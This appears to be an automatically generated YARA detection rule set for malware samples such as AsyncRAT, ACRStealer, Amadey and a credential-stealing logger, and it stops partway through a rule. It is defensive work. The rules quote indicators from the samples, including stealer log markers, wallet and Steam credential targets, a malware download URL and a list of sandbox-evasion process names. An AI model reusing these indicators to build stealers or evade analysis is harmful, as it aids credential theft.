/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb8 {
   meta:
      description = "_subset_batch - file 97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614"
   strings:
      $s1 = " Y=0x0,N,G,n=0x0;G=X['charAt'](n++);~G&&(N=Y%0x4?N*0x40+G:G,Y++%0x4)?f+=String['fromCharCode'](0xff&N>>(-0x2*Y&0x6)):0x0){G=P['i" ascii /* score: '9.00'*/
      $s2 = "(function(W,D){var G=i,a=W();while(!![]){try{var V=parseInt(G(0x150,'BHVk'))/0x1*(parseInt(G(0x30b,'w0Ul'))/0x2)+-parseInt(G(0x1" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 70KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6be74443 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6be74443.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6be74443637d33e1822ce883bafd3395732c3ca0138565dbe7367e1937995b5c"
   strings:
      $x1 = "DCnJECKdVWAVLA1HcIg2DWuvmrkueRcxpeebQL0867Trh4Go65yOK6Xnm0C9POu0peebQL0867Sl55tAvTzrtKXnm0C9POu0peebQL0867SHwR60t1imZDTNvhhf6WU2" wide /* score: '48.00'*/
      $x2 = "C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\imef.pdb" fullword ascii /* score: '37.00'*/
      $x3 = "System.Windows.Forms.DataGridViewHeaderBorderStyle, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5" ascii /* score: '36.00'*/
      $x4 = "System.Windows.Forms.DataGridViewHeaderBorderStyle, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5" ascii /* score: '36.00'*/
      $x5 = "System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '36.00'*/
      $x6 = "System.ComponentModel.Design.MultilineStringEditor, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d5" ascii /* score: '34.00'*/
      $x7 = "ASystem.ComponentModel.Design.MultilineStringEditor, System.DesignuSystem.Drawing.Design.UITypeEditor, System.Drawing, Version=4" ascii /* score: '34.00'*/
      $x8 = "bSystem.ComponentModel.Design.MultilineStringEditor, System.Design, PublicKeyToken=b03f5f7f11d50a3auSystem.Drawing.Design.UIType" ascii /* score: '34.00'*/
      $x9 = "System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '33.00'*/
      $x10 = "System.Windows.Forms.DataGridViewAutoSizeColumnsMode, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77" ascii /* score: '31.00'*/
      $x11 = "System.Windows.Forms.DataGridViewCellBorderStyle, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c5" ascii /* score: '31.00'*/
      $x12 = "System.Windows.Forms.DataGridViewSelectionMode, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561" ascii /* score: '31.00'*/
      $x13 = "System.Windows.Forms.DataGridViewCellBorderStyle, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c5" ascii /* score: '31.00'*/
      $x14 = "UxSystem.Windows.Forms.ScrollBars, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '31.00'*/
      $x15 = "System.Windows.Forms.DataGridViewSelectionMode, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      1 of ($x*)
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dbc5e631 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dbc5e631.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dbc5e631f121fd7f7381956b899cd94bef4dc50ba68f4fd99b6bdabc4b44de6e"
   strings:
      $x1 = "C:\\Users\\missq\\Downloads\\65CDRNBEBC\\44CALIBER-main\\44CALIBER-main\\44CALIBER\\obj\\Debug\\Insidious.pdb" fullword ascii /* score: '35.00'*/
      $s2 = "ProcessExecutablePath" fullword ascii /* score: '24.00'*/
      $s3 = "SELECT ExecutablePath, ProcessID FROM Win32_Process" fullword wide /* score: '24.00'*/
      $s4 = "\\Process.txt" fullword wide /* score: '23.00'*/
      $s5 = " :key: Passwords - " fullword wide /* score: '23.00'*/
      $s6 = "Insidious.exe" fullword wide /* score: '22.00'*/
      $s7 = " :spy: NEW LOG FROM - " fullword wide /* score: '22.00'*/
      $s8 = "ProtonVPN.exe" fullword wide /* score: '22.00'*/
      $s9 = "config\\loginusers.vdf" fullword wide /* score: '21.00'*/
      $s10 = "\\mozglue.dll" fullword wide /* score: '21.00'*/
      $s11 = "cryptonator.com" fullword wide /* score: '21.00'*/
      $s12 = "payeer.com" fullword wide /* score: '21.00'*/
      $s13 = "minergate.com" fullword wide /* score: '21.00'*/
      $s14 = "blockchain.com" fullword wide /* score: '21.00'*/
      $s15 = "github.com" fullword wide /* score: '21.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_9e67604b7e1df7de0cc39fa2e1a38a96f8525957705e2ebe35be0aa601f442db_9e67604b {
   meta:
      description = "_subset_batch - file 9e67604b7e1df7de0cc39fa2e1a38a96f8525957705e2ebe35be0aa601f442db_9e67604b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9e67604b7e1df7de0cc39fa2e1a38a96f8525957705e2ebe35be0aa601f442db"
   strings:
      $s1 = "publickey-hostbound@openssh.com" fullword ascii /* score: '29.00'*/
      $s2 = "publickey-hostbound-v00@openssh.com" fullword ascii /* score: '29.00'*/
      $s3 = "UpdateHostKeys=ask is incompatible with remote command execution; disabling" fullword ascii /* score: '28.00'*/
      $s4 = "Executing proxy dialer command: %.500s" fullword ascii /* score: '27.00'*/
      $s5 = "hostkeys-prove-00@openssh.com" fullword ascii /* score: '26.00'*/
      $s6 = "hostkeys-00@openssh.com" fullword ascii /* score: '26.00'*/
      $s7 = "key(s) for %s%s%s exist under other names; skipping UserKnownHostsFile update" fullword ascii /* score: '25.00'*/
      $s8 = "Executing command: '%.500s'" fullword ascii /* score: '24.00'*/
      $s9 = "process_cmdline" fullword ascii /* score: '23.00'*/
      $s10 = "missing hostkey loader" fullword ascii /* score: '23.00'*/
      $s11 = "cancel-streamlocal-forward@openssh.com" fullword ascii /* score: '22.00'*/
      $s12 = "forwarded-streamlocal@openssh.com" fullword ascii /* score: '22.00'*/
      $s13 = "ProxyCommand=- and ProxyUseFDPass are incompatible" fullword ascii /* score: '22.00'*/
      $s14 = "streamlocal-forward@openssh.com" fullword ascii /* score: '22.00'*/
      $s15 = "remote forward %s for: listen %s%s%d, connect %s:%d" fullword ascii /* score: '21.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule ACRStealer_signature__40dec4ca216f60d6c7e569184eb06742_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_40dec4ca216f60d6c7e569184eb06742(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a6e472c564854e8d7fe2c540d3cbb9913e8bf02b18d2cb6e1b46f52c910f82f"
   strings:
      $x1 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $s2 = "sciter32.dll" fullword wide /* score: '23.00'*/
      $s3 = "'%s' - incompatible operands %V and %V" fullword ascii /* score: '23.00'*/
      $s4 = "euxtheme.dll" fullword wide /* score: '23.00'*/
      $s5 = "ruiautomationcore.dll" fullword wide /* score: '23.00'*/
      $s6 = "sciter.dll" fullword wide /* score: '23.00'*/
      $s7 = "F:\\hsmile5\\sdk\\bin\\sciter32.pdb" fullword ascii /* score: '22.00'*/
      $s8 = "attempt to png_read_frame_head() but no acTL present" fullword ascii /* score: '22.00'*/
      $s9 = "destination.video.sciter.com" fullword ascii /* score: '21.00'*/
      $s10 = "attempt to get/set state '%S' on null" fullword ascii /* score: '19.00'*/
      $s11 = "attempt to get/set attribute '%S' on null" fullword ascii /* score: '19.00'*/
      $s12 = "attempt to get/set property '%S' on null" fullword ascii /* score: '19.00'*/
      $s13 = "Length.morph - incompatible values" fullword ascii /* score: '18.00'*/
      $s14 = "DyBase error: %d - '%s'" fullword ascii /* score: '18.00'*/
      $s15 = "32.dll" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      1 of ($x*) and 4 of them
}

rule sig_9ceb03fa1f0fc5084b856c4e099cb8391eef74b9ce1d1278bf01908469f7de7c_9ceb03fa {
   meta:
      description = "_subset_batch - file 9ceb03fa1f0fc5084b856c4e099cb8391eef74b9ce1d1278bf01908469f7de7c_9ceb03fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ceb03fa1f0fc5084b856c4e099cb8391eef74b9ce1d1278bf01908469f7de7c"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '48.00'*/
      $x2 = "mblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKey" ascii /* score: '36.00'*/
      $x3 = "notepad++ [--help] [-multiInst] [-noPlugin] [-lLanguage] [-udl=\"My UDL Name\"] [-LlangCode] [-nLineNumber] [-cColumnNumber] [-p" wide /* score: '36.00'*/
      $s4 = "ShellExecute - ERROR" fullword wide /* score: '29.00'*/
      $s5 = " c:\\tmp\\certifError.log" fullword wide /* score: '28.00'*/
      $s6 = "An attempt was made to execute the below command." fullword wide /* score: '26.00'*/
      $s7 = "Failed to save dump file to '%s' (error %d)" fullword wide /* score: '24.00'*/
      $s8 = "Failed to create dump file '%s' (error %d)" fullword wide /* score: '24.00'*/
      $s9 = "m.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" ascii /* score: '23.00'*/
      $s10 = "For Baan code, determines whether all preprocessor code is styled in the preprocessor style (0, the default) or only from the in" ascii /* score: '23.00'*/
      $s11 = "nppPluginList.dll" fullword wide /* score: '23.00'*/
      $s12 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '22.00'*/
      $s13 = "lexer.gdscript.keywords2.no.sub.identifiers" fullword ascii /* score: '22.00'*/
      $s14 = "nppFlushFileBuffersFails.log" fullword wide /* score: '22.00'*/
      $s15 = "msedge.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule b26458a0b60f4af597433fb7eff7b949ca96e59330f4e4bb85005e8bbcfa4f59_b26458a0 {
   meta:
      description = "_subset_batch - file b26458a0b60f4af597433fb7eff7b949ca96e59330f4e4bb85005e8bbcfa4f59_b26458a0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b26458a0b60f4af597433fb7eff7b949ca96e59330f4e4bb85005e8bbcfa4f59"
   strings:
      $s1 = "WMIExec" fullword ascii /* score: '16.00'*/
      $s2 = "C-Sto/goWMIExec" fullword ascii /* score: '16.00'*/
      $s3 = "ZaGVycywgYW5" fullword ascii /* base64 encoded string 'hers, an' */ /* score: '15.00'*/
      $s4 = "ub.com/shadow1ng/fscan" fullword ascii /* score: '15.00'*/
      $s5 = "PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
      $s6 = "(*RegArgs).Dump9I.w" fullword ascii /* score: '14.00'*/
      $s7 = "AGRGZGduo" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s8 = "eyJtZDUiOnRc" fullword ascii /* base64 encoded string '"md5":t\' */ /* score: '14.00'*/
      $s9 = "MGFiY2RlZ" fullword ascii /* base64 encoded string '0abcde' */ /* score: '14.00'*/
      $s10 = "U3ByaW5nQmxC" fullword ascii /* base64 encoded string 'SpringBlB' */ /* score: '14.00'*/
      $s11 = ".dll$k1Vh" fullword ascii /* score: '13.00'*/
      $s12 = "portscan" fullword ascii /* score: '12.00'*/
      $s13 = "omitemptM9" fullword ascii /* score: '12.00'*/
      $s14 = "XCommandh" fullword ascii /* score: '12.00'*/
      $s15 = "qb2wvZXBk" fullword ascii /* base64 encoded string 'ol/epd' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 18000KB and
      8 of them
}

rule ACRStealer_signature__45516b246c6a2462420e3e580d1a2c2d_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_45516b246c6a2462420e3e580d1a2c2d(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e211f51a7321a05ff5519e1128c04dc081be9acf71027ca60310046190d4b199"
   strings:
      $s1 = "https://www.jihosoft.com/ 0" fullword ascii /* score: '17.00'*/
      $s2 = "?connectToHostEncrypted@QSslSocket@@QAEXABVQString@@G0V?$QFlags@W4OpenModeFlag@QIODevice@@@@@Z" fullword ascii /* score: '14.00'*/
      $s3 = "?connectToHostEncrypted@QSslSocket@@QAEXABVQString@@GV?$QFlags@W4OpenModeFlag@QIODevice@@@@@Z" fullword ascii /* score: '14.00'*/
      $s4 = "?setPrivateConfiguration@QNetworkSessionPrivate@@IBEXAAVQNetworkConfiguration@@V?$QExplicitlySharedDataPointer@VQNetworkConfigur" ascii /* score: '13.00'*/
      $s5 = "QHttpThreadDelegate::finishedWithErrorSlot: HTTP reply had already been deleted, internal problem. Please report." fullword ascii /* score: '13.00'*/
      $s6 = "content-type missing in HTTP POST, defaulting to application/octet-stream" fullword ascii /* score: '13.00'*/
      $s7 = "?privateConfiguration@QNetworkSessionPrivate@@IBE?AV?$QExplicitlySharedDataPointer@VQNetworkConfigurationPrivate@@@@ABVQNetworkC" ascii /* score: '13.00'*/
      $s8 = "QHttpThreadDelegate::finishedSlot: HTTP reply had already been deleted, internal problem. Please report." fullword ascii /* score: '13.00'*/
      $s9 = "?isIPv4Address@QHostAddress@@QBE_NXZ" fullword ascii /* score: '12.00'*/
      $s10 = "?ip4Addr@QHostAddress@@QBEIXZ" fullword ascii /* score: '12.00'*/
      $s11 = "dThe proxy type is invalid for this operation" fullword ascii /* score: '12.00'*/
      $s12 = "dQFtpDTP Passive state socket" fullword ascii /* score: '12.00'*/
      $s13 = "?isIp4Addr@QHostAddress@@QBE_NXZ" fullword ascii /* score: '12.00'*/
      $s14 = "?AVQHttpSetHostRequest@@" fullword ascii /* score: '12.00'*/
      $s15 = "HostLookup" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule ACRStealer_signature__efb56419c1ba206d8c70e3157d5c83a0_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_efb56419c1ba206d8c70e3157d5c83a0(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a973579254181257abde474cb3cd1e7ff7ccd117a50dc6d8ea4b379c888a2a26"
   strings:
      $s1 = "d:\\a01\\_work\\11\\s\\binaries\\x86ret\\bin\\i386\\mfc140u.i386.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide /* score: '15.00'*/
      $s3 = "%s%s%X.tmp" fullword wide /* score: '15.00'*/
      $s4 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s5 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s6 = "d:\\a01\\_work\\11\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin1.inl" fullword wide /* score: '13.00'*/
      $s7 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\appcore.cpp" fullword wide /* score: '13.00'*/
      $s8 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword wide /* score: '13.00'*/
      $s9 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\filecore.cpp" fullword wide /* score: '13.00'*/
      $s10 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\daocore.cpp" fullword wide /* score: '13.00'*/
      $s11 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\sockcore.cpp" fullword wide /* score: '13.00'*/
      $s12 = "d:\\a01\\_work\\11\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin2.inl" fullword wide /* score: '13.00'*/
      $s13 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\afxstate.cpp" fullword wide /* score: '13.00'*/
      $s14 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\array_s.cpp" fullword wide /* score: '13.00'*/
      $s15 = "d:\\a01\\_work\\11\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\dbcore.cpp" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      8 of them
}

rule sig_9fb7124d1a355a73a9290333dd58e8b67ec768d3dc440f187d335881a07acdff_9fb7124d {
   meta:
      description = "_subset_batch - file 9fb7124d1a355a73a9290333dd58e8b67ec768d3dc440f187d335881a07acdff_9fb7124d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9fb7124d1a355a73a9290333dd58e8b67ec768d3dc440f187d335881a07acdff"
   strings:
      $s1 = "__pthread_mutexattr_getkind_np" fullword ascii /* score: '23.00'*/
      $s2 = "__pthread_mutexattr_getpshared" fullword ascii /* score: '23.00'*/
      $s3 = "__pthread_mutexattr_gettype" fullword ascii /* score: '23.00'*/
      $s4 = "grep -l '%s' /proc/[0-9]*/comm 2>/dev/null | head -n1 | xargs dirname 2>/dev/null | xargs basename 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "__pthread_mutexattr_settype" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s7 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s8 = "__pthread_mutex_trylock" fullword ascii /* score: '18.00'*/
      $s9 = "pthread_keys_mutex" fullword ascii /* score: '18.00'*/
      $s10 = "__pthread_mutexattr_setkind_np" fullword ascii /* score: '18.00'*/
      $s11 = "__pthread_mutexattr_setpshared" fullword ascii /* score: '18.00'*/
      $s12 = "__pthread_mutexattr_destroy" fullword ascii /* score: '18.00'*/
      $s13 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s14 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s15 = "__pthread_mutexattr_init" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      8 of them
}

rule sig_98ee0cb07c92488fdf159e5d505f6927_imphash_ {
   meta:
      description = "_subset_batch - file 98ee0cb07c92488fdf159e5d505f6927(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0226bffae3033a466a292824e9780ac98c11a4e1d4fad967b6fced2c99dcbe1"
   strings:
      $s1 = "vboxservice.exe" fullword ascii /* score: '25.00'*/
      $s2 = "procmon64.exe" fullword ascii /* score: '22.00'*/
      $s3 = "wireshark.exe" fullword ascii /* score: '22.00'*/
      $s4 = "vboxtray.exe" fullword ascii /* score: '22.00'*/
      $s5 = "fiddler.exe" fullword ascii /* score: '22.00'*/
      $s6 = "vmtoolsd.exe" fullword ascii /* score: '22.00'*/
      $s7 = "procmon.exe" fullword ascii /* score: '22.00'*/
      $s8 = "vmusrvc.exe" fullword ascii /* score: '22.00'*/
      $s9 = "vmsrvc.exe" fullword ascii /* score: '22.00'*/
      $s10 = "C:\\Windows\\System32\\" fullword ascii /* score: '18.00'*/
      $s11 = "Failed to start background loader." fullword ascii /* score: '16.00'*/
      $s12 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s13 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s14 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s15 = "[-] NtCreateThreadEx not found" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule Amadey_signature__40c6fa0bae4a4073700c5b83b959e25e_imphash_ {
   meta:
      description = "_subset_batch - file Amadey(signature)_40c6fa0bae4a4073700c5b83b959e25e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2fd3d4a53dba424e61cab4f1f7b2f6d02079e0d0f06ed91dcc9f5214b1ee174a"
   strings:
      $s1 = " http://crl.verisign.com/pca3.crl0" fullword ascii /* score: '13.00'*/
      $s2 = "EComponentError0FA" fullword ascii /* score: '10.00'*/
      $s3 = "Common Engineering Services1" fullword ascii /* score: '10.00'*/
      $s4 = ":&;*;.;2;6;<;" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s5 = ":.:6:@:E:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'n' */
      $s6 = "\\*.U)e:\"" fullword ascii /* score: '8.00'*/
      $s7 = "EVariantBadVarTypeError0" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Amadey_signature__26e8c06999c493658d386f95beadbd86_imphash_ {
   meta:
      description = "_subset_batch - file Amadey(signature)_26e8c06999c493658d386f95beadbd86(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8726871335a976e783081d5c9adfb3b2f4b1eacbd321d648c8a859ea87cbd7f5"
   strings:
      $x1 = "C:\\Users\\ilya\\Desktop\\podmorph\\Debug\\podmorph.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "http://lena255f.beget.tech/go.txt" fullword ascii /* score: '19.00'*/
      $s3 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_type_info.cpp" fullword ascii /* score: '16.00'*/
      $s4 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii /* score: '16.00'*/
      $s5 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\StlCompareStringA.cpp" fullword wide /* score: '16.00'*/
      $s6 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide /* score: '16.00'*/
      $s7 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide /* score: '16.00'*/
      $s8 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide /* score: '16.00'*/
      $s9 = "D:\\a\\_work\\1\\s\\binaries\\x86ret\\inc\\optional" fullword ascii /* score: '15.00'*/
      $s10 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\xwcsxfrm.cpp" fullword ascii /* score: '13.00'*/
      $s11 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\_tolower.cpp" fullword ascii /* score: '13.00'*/
      $s12 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\StlLCMapStringA.cpp" fullword ascii /* score: '13.00'*/
      $s13 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\xstrcoll.cpp" fullword ascii /* score: '13.00'*/
      $s14 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\inc\\internal_shared.h" fullword wide /* score: '13.00'*/
      $s15 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\src\\xmbtowc.cpp" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__6e0d36f5ebd5b5226c824e12dbf61fbf_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_6e0d36f5ebd5b5226c824e12dbf61fbf(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b8cc920793954f42a30b9d16a49adec0b8c997bccaf052e6621d70d12589dda"
   strings:
      $x1 = "%s: Create process failed with chkdsk.exe" fullword ascii /* score: '35.50'*/
      $x2 = "%s: Create process failed with convert.exe" fullword ascii /* score: '35.50'*/
      $x3 = "C:\\Windows\\System32\\ntdll.dll" fullword wide /* score: '34.00'*/
      $x4 = "C:\\WinNT\\System32\\ntdll.dll" fullword wide /* score: '34.00'*/
      $s5 = "%s: Get guid failed for chkdsk.exe" fullword ascii /* score: '29.50'*/
      $s6 = "ComLib.dll" fullword ascii /* score: '26.00'*/
      $s7 = "%s: =============== Dump GPT header information ===============" fullword ascii /* score: '25.50'*/
      $s8 = "LogInfo.log" fullword ascii /* score: '25.00'*/
      $s9 = "WriteLog faild! FileName:LogInfo.log ErrorCode:%d" fullword ascii /* score: '25.00'*/
      $s10 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s11 = "Failed to load ntdll.dll" fullword ascii /* score: '23.00'*/
      $s12 = "http://sn.aomeisoftware.com/api/v1/reinstate-subscription" fullword ascii /* score: '23.00'*/
      $s13 = "http://sn.aomeisoftware.com/api/v1/deactivate-subscription" fullword ascii /* score: '23.00'*/
      $s14 = "AmCore.dll" fullword wide /* score: '23.00'*/
      $s15 = "RegByWan::GetToken: (RBW:%d):Error Code:%d---token:%s" fullword ascii /* score: '22.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule af8e819c5a8fab84294733434a2580fc_imphash_ {
   meta:
      description = "_subset_batch - file af8e819c5a8fab84294733434a2580fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e608168f386ab996774d6cc16fa71a8938e869e0a1763309cc2d5694e3901d33"
   strings:
      $s1 = "   <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" p" ascii /* score: '27.00'*/
      $s2 = "   <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" p" ascii /* score: '24.00'*/
      $s3 = "yepscan.exe" fullword wide /* score: '23.00'*/
      $s4 = " <assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"CompanyName.ProductName.AppName\" type=\"win32\"/>" fullword ascii /* score: '22.00'*/
      $s5 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">" fullword ascii /* score: '17.00'*/
      $s6 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '17.00'*/
      $s7 = "VVVVVVR" fullword ascii /* reversed goodware string 'RVVVVVV' */ /* score: '16.50'*/
      $s8 = "Yepscan is a process memory scanner." fullword wide /* score: '16.00'*/
      $s9 = "    <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s10 = "Threatbook - https://www.threatbook.cn" fullword wide /* score: '15.00'*/
      $s11 = "TTTTTT*" fullword ascii /* reversed goodware string '*TTTTTT' */ /* score: '14.00'*/
      $s12 = "   <!-- Windows Vista -->" fullword ascii /* score: '12.00'*/
      $s13 = "   <!-- Windows 8 -->" fullword ascii /* score: '12.00'*/
      $s14 = "   <!-- Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s15 = "   <!-- Windows 7 -->" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule sig_98f80ddb4abc202286c693b9ccb18d31451ee94336636c8cd7ece2fae7890152_98f80ddb {
   meta:
